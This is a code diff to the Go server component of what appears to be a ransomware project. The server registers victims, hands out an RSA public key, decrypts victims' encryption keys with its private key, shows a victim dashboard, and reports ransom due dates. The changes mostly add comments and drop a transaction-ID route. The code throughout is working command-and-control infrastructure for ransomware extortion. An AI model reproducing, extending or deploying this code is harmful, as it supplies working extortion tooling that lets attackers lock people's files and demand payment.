@@ -17,17 +17,14 @@ import (
 
 	"github.com/joho/godotenv"
 	"github.com/nireo/gocry/server/gen_rsa"
-	uuid "github.com/satori/go.uuid"
 	"gorm.io/driver/postgres"
 	"gorm.io/gorm"
 )
 
 var db *gorm.DB
 
-func GiveTransactionID(w http.ResponseWriter, r *http.Request) {
-	w.Write([]byte("your transaction id"))
-}
-
+// DecryptKey takes a RSA encrypted key and then decrypts that key using the private key stored in
+// the server.
 func DecryptKey(w http.ResponseWriter, r *http.Request) {
 	key, err := ioutil.ReadAll(r.Body)
 	if err != nil {
@@ -41,10 +38,13 @@ func DecryptKey(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// decode the pem data
 	block, _ := pem.Decode(pemd)
 	if block == nil {
 		log.Fatalf("bad key data: %s", "not PEM-encoded")
 	}
+
+	// check that the key is of the right type.
 	if got, want := block.Type, "RSA PRIVATE KEY"; got != want {
 		log.Fatalf("unknown key type %q, want %q", got, want)
 	}
@@ -55,13 +55,7 @@ func DecryptKey(w http.ResponseWriter, r *http.Request) {
 		log.Fatalf("bad private key: %s", err)
 	}
 
-	uuid, err := uuid.NewV4()
-	if err != nil {
-		log.Fatalf("error generating uuid for key: %s", err)
-		return
-	}
-
-	out, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, key, []byte("encrypted-key-"+uuid.String()))
+	out, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, key, []byte("key.txt"))
 	if err != nil {
 		log.Fatalf("decrypt: %s", err)
 	}
@@ -82,6 +76,7 @@ type victimHtmlDisplay struct {
 	Victims []Victim
 }
 
+// ServeVictimsDisplay returns a simple html page with all the victims and they information.
 func ServeVictimsDisplay(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "text/html")
 
@@ -100,6 +95,7 @@ func ServeVictimsDisplay(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
+// GetRSAPubKey returns the public key to the user.
 func GetRSAPubKey(w http.ResponseWriter, r *http.Request) {
 	data, err := ioutil.ReadFile("./public.pem")
 	if err != nil {
@@ -107,10 +103,10 @@ func GetRSAPubKey(w http.ResponseWriter, r *http.Request) {
 			http.StatusInternalServerError)
 	}
 
-	// w.Header().Set("Content-Type", "text/plain")
 	w.Write(data)
 }
 
+// Victim database model
 type Victim struct {
 	gorm.Model
 	UUID      string `json:"uuid"` // A unique id used to identify the victim
@@ -126,6 +122,7 @@ type newVictim struct {
 	Timestamp int64  `json:"timestamp"`
 }
 
+// RegisterNewVictim creates a new victim from a json request
 func RegisterNewVictim(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "bad request", http.StatusBadRequest)
@@ -162,6 +159,7 @@ func RegisterNewVictim(w http.ResponseWriter, r *http.Request) {
 	w.WriteHeader(http.StatusOK)
 }
 
+// GetRansomwareDueDate gets the time in which the user needs to have the ransom ready.
 func GetRansomwareDueDate(w http.ResponseWriter, r *http.Request) {
 	uuid := r.URL.Query().Get("id")
 	if uuid != "" {
@@ -181,7 +179,6 @@ func GetRansomwareDueDate(w http.ResponseWriter, r *http.Request) {
 }
 
 func main() {
-
 	// Load environment variables, such that we can take database parameters
 	if err := godotenv.Load(); err != nil {
 		log.Fatalf("could not load environment variables: %s", err)
@@ -192,6 +189,7 @@ func main() {
 	dbUser := os.Getenv("db_user")
 	dbName := os.Getenv("db_name")
 
+	// Connect to the database
 	var err error
 	db, err = gorm.Open(postgres.New(postgres.Config{
 		DSN: fmt.Sprintf("host=%s port=%s user=%s dbname=%s sslmode=disable",
@@ -207,6 +205,8 @@ func main() {
 
 	// This is mostly just for debugging purposes
 	if len(os.Args) == 2 && os.Args[1] == "remove_data" {
+
+		// find all victims and remove their database entries.
 		var victims []Victim
 		db.Find(&victims)
 		for _, victim := range victims {
@@ -216,21 +216,23 @@ func main() {
 		return
 	}
 
-	// ensure that a rsa keypair has been generated.
+	// ensure that a rsa public key exists
 	if _, err := os.Stat("./public.pem"); !os.IsNotExist(err) {
 		gen_rsa.GenerateRSAKeypair()
 	}
 
+	// ensure that a rsa private key exists
 	if _, err := os.Stat("./private.pem"); !os.IsNotExist(err) {
 		gen_rsa.GenerateRSAKeypair()
 	}
 
-	http.HandleFunc("/get_transaction", GiveTransactionID)
+	// Define routes
 	http.HandleFunc("/pubkey", GetRSAPubKey)
 	http.HandleFunc("/register", RegisterNewVictim)
 	http.HandleFunc("/dashboard", ServeVictimsDisplay)
 	http.HandleFunc("/due", GetRansomwareDueDate)
 
+	// start the http listener
 	if err := http.ListenAndServe("127.0.0.1:8080", nil); err != nil {
 		log.Fatalf("error while running listenandserver: %s", err.Error())
 	}
